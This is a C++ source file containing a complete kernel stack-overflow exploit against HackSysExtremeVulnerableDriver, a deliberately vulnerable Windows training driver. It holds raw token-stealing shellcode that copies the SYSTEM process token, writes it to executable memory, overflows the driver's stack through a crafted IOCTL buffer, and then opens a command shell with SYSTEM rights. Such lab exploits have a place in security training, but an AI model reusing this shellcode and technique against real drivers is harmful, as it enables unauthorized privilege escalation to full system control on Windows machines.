#include <iostream>
#include <windows.h>

#define PADDING 2072

int main(){


    HANDLE hevdHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        0xC0000000,
        0,
        NULL,
        0x3,
        0,
        NULL
    );

    if (hevdHandle == INVALID_HANDLE_VALUE){

        std::cout << "[-] Error in opening handle\n";
        return -1;
    }

    std::cout << "[+] Successfully opened handle!\n";

    
    unsigned char shellcode[] = 
        "\x50\x51\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x70\x48\x89\xC1\x48\xC7\xC2\x04\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00\x48\x89\x91\x08\x02\x00\x00\x5A\x59\x58" // Actual shellcode
        "\x48\x83\xc4\x28\xc3"; // Cleanup

    LPVOID virt = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlCopyMemory(virt, shellcode, sizeof(shellcode));

    unsigned char buffer[PADDING + sizeof(LPVOID)];

    memset(buffer, 'A', PADDING);
    memcpy(buffer+PADDING, (const char*)&virt, sizeof(LPVOID));

    DWORD outbuf;

    std::cout << "[*] Sending buffer to HEVD Stackoverflow\n";
    DeviceIoControl(hevdHandle, 0x222003, buffer, sizeof(buffer), NULL, 0, &outbuf, NULL);

    std::cout << "[+] Initializing CMD\n";
    system("cmd");
    return 0;

}